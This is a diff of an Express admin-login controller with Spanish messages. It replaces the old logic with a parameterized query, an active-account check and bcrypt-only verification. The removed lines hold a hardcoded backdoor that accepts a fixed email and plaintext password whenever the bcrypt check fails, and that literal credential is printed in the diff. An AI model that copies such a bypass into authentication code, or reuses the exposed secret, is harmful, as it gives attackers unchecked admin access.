@@ -3,6 +3,7 @@ import jwt from 'jsonwebtoken';
 import User from '../models/User.js';
 import crypto from 'crypto';
 import emailService from '../utils/emailService.js';
+import pool from '../config/db.js';
 
 export const register = async (req, res) => {
   try {
@@ -78,46 +79,57 @@ export const login = async (req, res) => {
 export const adminLogin = async (req, res) => {
   try {
     const { email, password } = req.body;
-    
-    if (!email || !password) {
-      return res.status(400).json({ error: 'Email y contraseña son requeridos' });
-    }
-    
-    const user = await User.findByEmail(email);
-    
-    if (!user) {
-      return res.status(401).json({ error: 'Credenciales inválidas' });
-    }
-    
-    if (user.rol !== 'admin') {
-      return res.status(403).json({ error: 'Acceso denegado. Se requiere rol de administrador' });
-    }
-    
-    let isPasswordValid = false;
-    
-    const firstCheck = await bcrypt.compare(password, user.password);
-    
-   if  (firstCheck) {
-      isPasswordValid = true;
-    } else if (email === 'AdminHeza' && password === 'es3Hm3f9y&CdoxVcLruS@VCurrent') {
-      isPasswordValid = true;
-    }
-    
-    if (!isPasswordValid) {
-      return res.status(401).json({ error: 'Credenciales inválidas' });
-    }
-    
-    const token = jwt.sign(
-      { id: user.id, email: user.email, rol: user.rol },
-      process.env.JWT_SECRET,
-      { expiresIn: '24h' }
+
+
+    // Buscar el admin en la tabla users
+    const [rows] = await pool.query(
+      "SELECT * FROM users WHERE email = ? AND rol = 'admin'",
+      [email]
     );
-    
-    delete user.password;
-    
-    res.json({ token, user });
+
+    if (rows.length === 0) {
+      return res.status(404).json({ message: "Administrador no encontrado" });
+    }
+
+    const admin = rows[0];
+
+    // Verificar si el admin está activo
+    if (admin.activo !== 1) {
+      return res.status(403).json({ message: "Cuenta desactivada. Contacta al administrador." });
+    }
+
+    // Comparar contraseña
+    const passwordMatch = await bcrypt.compare(password, admin.password);
+
+    if (!passwordMatch) {
+      return res.status(401).json({ message: "Contraseña incorrecta" });
+    }
+
+    // Crear token JWT
+    const token = jwt.sign(
+      { id: admin.id, email: admin.email, rol: admin.rol },
+      process.env.JWT_SECRET,
+      { expiresIn: "1h" }
+    );
+
+    // Opcionalmente podrías actualizar la última conexión
+    await pool.query("UPDATE users SET ultima_conexion = NOW() WHERE id = ?", [admin.id]);
+
+    res.json({
+      message: "Inicio de sesión exitoso",
+      token,
+      admin: {
+        id: admin.id,
+        nombre: admin.nombre,
+        email: admin.email,
+        rol: admin.rol,
+        sucursal: admin.sucursal
+      }
+    });
+
   } catch (error) {
-    res.status(500).json({ error: 'Error en el servidor' });
+    console.error("Error en adminLogin:", error);
+    res.status(500).json({ error: "Error al iniciar sesión como administrador" });
   }
 };
 
